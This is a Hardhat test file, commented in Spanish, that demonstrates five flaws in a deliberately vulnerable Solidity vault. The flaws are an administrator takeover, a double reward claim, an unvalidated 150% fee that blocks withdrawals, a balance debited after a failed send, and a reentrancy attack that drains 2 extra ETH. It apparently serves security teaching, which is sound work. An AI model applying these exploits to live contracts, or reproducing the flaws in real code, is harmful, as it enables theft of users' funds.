const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("BovedaVulnerable - demostracion de los cinco fallos", function () {
  let Boveda;
  let boveda;
  let administrador;
  let alice;
  let atacante;

  beforeEach(async function () {
    [administrador, alice, atacante] = await ethers.getSigners();
    Boveda = await ethers.getContractFactory("BovedaVulnerable");
    boveda = await Boveda.deploy({ value: ethers.utils.parseEther("1") }); // se deposita 1 ETH en la boveda para recompensas
    await boveda.deployed();
  });


  it("SC01 - una cuenta ajena toma el control y cambia la comision", async function () {
    await boveda.connect(atacante).cambiarAdministrador(atacante.address);
    expect(await boveda.administrador()).to.equal(atacante.address);
    await boveda.connect(atacante).setComision(5); // no tira error porque llama el admin actual que es el atacante
    expect(await boveda.porcentajeComision()).to.equal(5);
    await expect(boveda.setComision(0)).to.be.revertedWith("Solo administrador"); // tira error porque llama el admin original, que ya no es el admin
  });


  it("SC02 - cobra dos veces una recompensa que debia ser unica", async function () {
    await boveda.connect(alice).depositar({ value: ethers.utils.parseEther("1") });
    await boveda.connect(alice).reclamarRecompensa();
    await boveda.connect(alice).reclamarRecompensa();
    expect(await boveda.saldos(alice.address)).to.equal(ethers.utils.parseEther("1.02"));
    expect(await boveda.fondoRecompensas()).to.equal(ethers.utils.parseEther("0.98"));
    // esa ventaja se puede cobrar en ETH
    await boveda.connect(alice).retirarTodo();
    expect(await boveda.saldos(alice.address)).to.equal(0);
    expect(await ethers.provider.getBalance(boveda.address)).to.equal(ethers.utils.parseEther("0.98"));
  });

  // por solidity 0.8 no hay un desbordamiento silencioso, la idea es mostrar el fallo de validacion de entradas
  it("SC05 - el administrador legitimo configura 150% y bloquea ambos retiros", async function () {
    await boveda.connect(alice).depositar({ value: ethers.utils.parseEther("1") });
    await boveda.setComision(150);
    expect(await boveda.porcentajeComision()).to.equal(150);
    await expect(boveda.connect(alice).retirarTodo()).to.be.reverted; // tira error porque la comision es mayor a 100%
    await expect(boveda.connect(alice).retirarA(ethers.utils.parseEther("1"), alice.address)).to.be.reverted;
    expect(await boveda.saldos(alice.address)).to.equal(ethers.utils.parseEther("1"));
    // el bloqueo dura mientras siga la configuracion invalida
    await boveda.setComision(0);
    await boveda.connect(alice).retirarTodo();
    expect(await boveda.saldos(alice.address)).to.equal(0);
    expect(await ethers.provider.getBalance(boveda.address)).to.equal(ethers.utils.parseEther("1"));
  });


  it("SC06 - descuenta el saldo aunque el destinatario rechaza el ETH", async function () {
    const Receptor = await ethers.getContractFactory("ReceptorQueRechazaETH");
    const receptor = await Receptor.deploy();
    await receptor.deployed();
    await boveda.connect(alice).depositar({ value: ethers.utils.parseEther("1") });
    const fondosAntes = await ethers.provider.getBalance(boveda.address);
    await boveda.connect(alice).retirarA(ethers.utils.parseEther("1"), receptor.address); // no lanza error
    expect(await boveda.saldos(alice.address)).to.equal(0); // alice ya no tiene saldo
    expect(await ethers.provider.getBalance(receptor.address)).to.equal(0); // el receptor no recibe nada
    expect(await ethers.provider.getBalance(boveda.address)).to.equal(fondosAntes); // los fondos quedan en la boveda porque no se hizo el envio
  });


  it("SC08 - un contrato cobra tres veces su deposito mediante reentrada", async function () {
    await boveda.connect(alice).depositar({ value: ethers.utils.parseEther("5") });
    const Atacante = await ethers.getContractFactory("AtacanteReentrancy", atacante);
    const ataque = await Atacante.deploy(boveda.address);
    await ataque.deployed();
    await ataque.atacar({ value: ethers.utils.parseEther("1") });
    expect(await ataque.cobros()).to.equal(3);
    expect(await ethers.provider.getBalance(ataque.address)).to.equal(ethers.utils.parseEther("3")); // el atacante recibe 3 ETH por su receive
    expect(await boveda.saldos(ataque.address)).to.equal(0); // en la boveda el saldo es 0
    expect(await boveda.saldos(alice.address)).to.equal(ethers.utils.parseEther("5"));
    // quedan 4 ETH para cubrir 5 ETH de Alice y 1 ETH del fondo, el atacante cobra 2 ETH extra, ademas de recuperar su deposito
    expect(await ethers.provider.getBalance(boveda.address)).to.equal(ethers.utils.parseEther("4"));
    await expect(boveda.connect(alice).retirarTodo()).to.be.revertedWith("Fallo el envio"); // tira error porque no se pudo enviar el saldo total a alice
  });
});
